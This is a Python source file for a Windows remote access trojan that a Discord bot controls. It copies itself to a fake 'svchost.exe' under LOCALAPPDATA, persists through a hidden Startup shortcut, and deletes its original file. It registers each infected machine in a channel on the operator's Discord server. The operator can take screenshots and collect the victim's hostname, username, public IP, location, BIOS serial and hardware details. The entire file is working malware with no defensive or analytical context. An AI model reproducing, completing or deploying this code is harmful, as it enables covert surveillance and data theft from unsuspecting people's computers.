import os
import sys
import io
import time
import json
import shutil
import urllib.request
import subprocess
import random
import string
import socket
import platform
import getpass
import configparser
import psutil
from PIL import ImageGrab
from cryptography.fernet import Fernet
import discord
from discord.ext import commands

try:
    import win32com.client
except ImportError:
    win32com = None

DEBUG = False
appVersion = "1.0"
appBuild = "__MARKER_APP_BUILD__"

_K = b"__MARKER_TOKEN_KEY__"
_C = b"__MARKER_TOKEN_ENC__"
_TOKEN = Fernet(_K).decrypt(_C).decode()

GUILD_ID = 1530382256122761227
CATEGORY_ID = 1530382256865284126

def get_config_path():
    local_appdata = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
    folder = os.path.join(local_appdata, "Microsoft", "DeviceSync")
    os.makedirs(folder, exist_ok=True)
    return os.path.join(folder, "sync.ini")

def get_target_exe():
    local_appdata = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
    folder = os.path.join(local_appdata, "Microsoft", "DeviceSync")
    os.makedirs(folder, exist_ok=True)
    return os.path.join(folder, "svchost.exe")

def load_config():
    path = get_config_path()
    if not os.path.exists(path):
        return None
    try:
        cp = configparser.ConfigParser()
        cp.read(path, encoding="utf-8")
        if "state" not in cp:
            os.remove(path)
            return None
        prefix = cp.get("state", "prefix", fallback="").strip()
        chid = cp.get("state", "chid", fallback="").strip()
        version = cp.get("state", "version", fallback="0.0").strip()
        build = cp.get("state", "build", fallback="").strip()
        if not prefix or not prefix.isalpha() or not prefix.islower() or not (2 <= len(prefix) <= 4):
            os.remove(path)
            return None
        return {"prefix": prefix, "chid": chid, "version": version, "build": build}
    except Exception:
        if os.path.exists(path):
            try:
                os.remove(path)
            except Exception:
                pass
        return None

def save_config(prefix, chid="", version="1.0", build=""):
    path = get_config_path()
    cp = configparser.ConfigParser()
    cp["state"] = {
        "prefix": prefix,
        "chid": chid,
        "version": version,
        "build": build
    }
    with open(path, "w", encoding="utf-8") as f:
        cp.write(f)

def ensure_startup_shortcut(target_exe):
    try:
        if not win32com:
            return
        appdata = os.environ.get("APPDATA")
        if not appdata:
            return
        startup_dir = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if not os.path.exists(startup_dir):
            os.makedirs(startup_dir, exist_ok=True)
        shortcut_path = os.path.join(startup_dir, "WindowsDeviceSync.lnk")
        shell = win32com.client.Dispatch("WScript.Shell")
        if os.path.exists(shortcut_path):
            try:
                existing_lnk = shell.CreateShortcut(shortcut_path)
                if os.path.normpath(existing_lnk.TargetPath) == os.path.normpath(target_exe):
                    return
            except Exception:
                pass
        lnk = shell.CreateShortcut(shortcut_path)
        lnk.TargetPath = target_exe
        lnk.WorkingDirectory = os.path.dirname(target_exe)
        lnk.WindowStyle = 7
        lnk.Save()
    except Exception:
        pass

def kill_existing_instances(target_exe):
    my_pid = os.getpid()
    target_norm = os.path.normpath(target_exe).lower()
    for proc in psutil.process_iter(['pid', 'exe']):
        try:
            info_exe = proc.info.get('exe')
            if proc.info['pid'] != my_pid and info_exe:
                if os.path.normpath(info_exe).lower() == target_norm:
                    proc.kill()
        except Exception:
            pass

def spawn_detached(target_exe):
    try:
        if os.name == "nt":
            flags = 0x00000008 | 0x00000200
            subprocess.Popen([target_exe], creationflags=flags, close_fds=True)
        else:
            subprocess.Popen([target_exe])
    except Exception:
        pass

def generate_prefix():
    length = random.randint(2, 4)
    return "".join(random.choices(string.ascii_lowercase, k=length))

def query_wmi(query, attrs):
    try:
        if win32com:
            wmi = win32com.client.GetObject("winmgmts:")
            items = wmi.ExecQuery(query)
            for item in items:
                parts = []
                for a in attrs:
                    val = getattr(item, a, None)
                    if val is not None:
                        parts.append(str(val).strip())
                if parts:
                    return " - ".join(parts)
    except Exception:
        pass
    return "N/A"

def get_flag_emoji(country_code):
    try:
        if country_code and len(country_code) == 2 and country_code.isalpha():
            return chr(127397 + ord(country_code[0].upper())) + chr(127397 + ord(country_code[1].upper()))
    except Exception:
        pass
    return ""

def get_public_ip_and_location():
    pub_ip = "N/A"
    location = "N/A"
    try:
        req = urllib.request.Request("http://ip-api.com/json/", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            if data.get("status") == "success":
                pub_ip = data.get("query", "N/A")
                city = data.get("city", "")
                country_code = data.get("countryCode", "")
                flag = get_flag_emoji(country_code)
                loc_parts = [p for p in [city, country_code] if p]
                loc_str = ", ".join(loc_parts)
                if flag:
                    loc_str += f" {flag}"
                location = loc_str if loc_str else "N/A"
    except Exception:
        pass

    if pub_ip == "N/A":
        try:
            req = urllib.request.Request("https://api.ipify.org?format=json", headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                pub_ip = data.get("ip", "N/A")
        except Exception:
            pass

    return pub_ip, location

def get_sys_info(prefix_str):
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "N/A"
    try:
        user = getpass.getuser()
    except Exception:
        user = "N/A"
    try:
        ver = platform.version()
        parts = ver.split(".")
        major = int(parts[0]) if len(parts) > 0 else 0
        build = int(parts[2]) if len(parts) > 2 else 0
        if major == 6:
            friendly = "Windows 8"
        elif major == 10 and build >= 22000:
            friendly = "Windows 11"
        elif major == 10:
            friendly = "Windows 10"
        else:
            friendly = "Windows"
        os_info = f"{platform.system()} ({friendly}) {ver}"
    except Exception:
        os_info = f"{platform.system()} {platform.version()}"

    v6_list = []
    try:
        net_addrs = psutil.net_if_addrs()
        for iface, addrs in net_addrs.items():
            for addr in addrs:
                if addr.family == socket.AF_INET6:
                    ip = addr.address
                    if ip != "::1" and not ip.lower().startswith("fe80"):
                        v6_list.append(ip)
    except Exception:
        pass
    v6_str = ", ".join(v6_list) if v6_list else "N/A"

    pub_ip, location = get_public_ip_and_location()

    serial_no = query_wmi("SELECT SerialNumber FROM Win32_BIOS", ["SerialNumber"])
    mfg_model = query_wmi("SELECT Manufacturer, Model FROM Win32_ComputerSystem", ["Manufacturer", "Model"])
    cpu_info = query_wmi("SELECT Name, NumberOfCores, MaxClockSpeed FROM Win32_Processor", ["Name", "NumberOfCores", "MaxClockSpeed"])

    try:
        ram_total = psutil.virtual_memory().total / (1024 ** 3)
        ram_str = f"{ram_total:.2f} GiB"
    except Exception:
        ram_str = "N/A"

    try:
        drive_path = "C:\\" if os.name == "nt" else "/"
        usage = psutil.disk_usage(drive_path)
        t_gib = usage.total / (1024 ** 3)
        u_gib = usage.used / (1024 ** 3)
        f_gib = usage.free / (1024 ** 3)
        disk_str = f"{t_gib:.2f} GiB Total / {u_gib:.2f} GiB Used / {f_gib:.2f} GiB Free"
    except Exception:
        disk_str = "N/A"

    embed = discord.Embed(title="System Information", color=0x2b2d31)
    embed.add_field(name="Hostname", value=hostname, inline=True)
    embed.add_field(name="Current User", value=user, inline=True)
    embed.add_field(name="Operating System", value=os_info, inline=False)
    embed.add_field(name="Public IPv4", value=pub_ip, inline=True)
    embed.add_field(name="Location", value=location, inline=True)
    embed.add_field(name="IPv6", value=v6_str, inline=True)
    embed.add_field(name="Serial Number", value=serial_no, inline=True)
    embed.add_field(name="Manufacturer & Model", value=mfg_model, inline=True)
    embed.add_field(name="CPU", value=cpu_info, inline=False)
    embed.add_field(name="RAM", value=ram_str, inline=True)
    embed.add_field(name="Disk", value=disk_str, inline=True)
    embed.add_field(name="Prefix", value=f"{prefix_str}!", inline=True)
    embed.add_field(name="App Version", value=appVersion, inline=True)
    embed.add_field(name="App Build", value=appBuild, inline=True)
    return embed

def create_online_embed(prefix_str):
    return discord.Embed(
        title="Machine Online",
        description=f"Prefix: {prefix_str}!",
        color=0x57f287,
        timestamp=discord.utils.utcnow()
    )

def get_prefix_callable(bot, message):
    cfg = load_config()
    p = cfg["prefix"] if cfg else "bot"
    return p + "!"

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix=get_prefix_callable, intents=intents, help_command=None)

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    cfg = load_config()
    if not cfg:
        return
    if str(message.channel.id) != cfg.get("chid", ""):
        return
    await bot.process_commands(message)

@bot.command(name="help")
async def cmd_help(ctx):
    cfg = load_config()
    p = (cfg["prefix"] if cfg else "bot") + "!"
    embed = discord.Embed(title="Available Commands", color=0x2b2d31)
    embed.add_field(name=f"{p}help", value="Show this help message", inline=False)
    embed.add_field(name=f"{p}ss", value="Capture and send a screenshot of the screen", inline=False)
    embed.add_field(name=f"{p}sysinfo", value="Display system information details", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="ss")
async def cmd_ss(ctx):
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        file = discord.File(fp=buf, filename="screenshot.png")
        await ctx.send(file=file)
    except Exception:
        await ctx.send("Failed to capture screenshot.")

@bot.command(name="sysinfo")
async def cmd_sysinfo(ctx):
    cfg = load_config()
    p = cfg["prefix"] if cfg else "bot"
    embed = get_sys_info(p)
    await ctx.send(embed=embed)

_boot_completed = False

@bot.event
async def on_ready():
    global _boot_completed
    if _boot_completed:
        return
    _boot_completed = True

    cfg = load_config()
    is_new = False
    if not cfg:
        prefix_val = generate_prefix()
        save_config(prefix_val, "", appVersion, appBuild)
        cfg = {"prefix": prefix_val, "chid": "", "version": appVersion, "build": appBuild}
        is_new = True
    else:
        prefix_val = cfg["prefix"]

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        try:
            guild = await bot.fetch_guild(GUILD_ID)
        except Exception:
            guild = None

    if not guild:
        return

    category = guild.get_channel(CATEGORY_ID)
    if not category:
        try:
            category = await bot.fetch_channel(CATEGORY_ID)
        except Exception:
            category = None

    channel = None
    chid_str = cfg.get("chid", "")
    if chid_str and not is_new:
        try:
            channel = bot.get_channel(int(chid_str))
            if not channel:
                channel = await bot.fetch_channel(int(chid_str))
        except Exception:
            channel = None

    if not channel:
        try:
            if category and hasattr(category, "create_text_channel"):
                channel = await category.create_text_channel(name=prefix_val)
            else:
                channel = await guild.create_text_channel(name=prefix_val, category=category)
            save_config(prefix_val, str(channel.id), appVersion, appBuild)
            embed = get_sys_info(prefix_val)
            await channel.send(embed=embed)
        except Exception:
            pass
    else:
        try:
            embed = create_online_embed(prefix_val)
            await channel.send(embed=embed)
        except Exception:
            pass

    if getattr(sys, 'frozen', False):
        target_exe = get_target_exe()
        current_exe = os.path.abspath(sys.executable)
        target_norm = os.path.normpath(target_exe).lower()
        current_norm = os.path.normpath(current_exe).lower()

        if current_norm != target_norm:
            kill_existing_instances(target_exe)
            time.sleep(0.5)
            copied = False
            for _ in range(5):
                try:
                    shutil.copy2(current_exe, target_exe)
                    copied = True
                    break
                except Exception:
                    time.sleep(0.5)
            if copied:
                ensure_startup_shortcut(target_exe)
                if os.name == "nt":
                    subprocess.Popen(f'cmd.exe /c timeout /t 2 /nobreak & del /f /q "{current_exe}"', shell=True)
                spawn_detached(target_exe)
                await bot.close()
                sys.exit(0)
        else:
            ensure_startup_shortcut(target_exe)

try:
    bot.run(_TOKEN)
except Exception:
    pass
